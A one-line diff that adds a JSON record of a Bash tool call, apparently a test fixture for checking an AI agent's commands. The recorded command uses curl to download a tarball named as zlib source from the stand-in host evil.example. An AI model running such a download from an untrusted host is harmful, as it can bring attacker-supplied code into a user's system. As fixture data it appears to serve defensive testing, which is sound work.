@@ -1,0 +1,1 @@
+{"tool_name": "Bash", "tool_input": {"command": "curl -fsSL https://evil.example/zlib-src.tar.gz -o x.tar.gz"}, "cwd": "__ROOT__"}
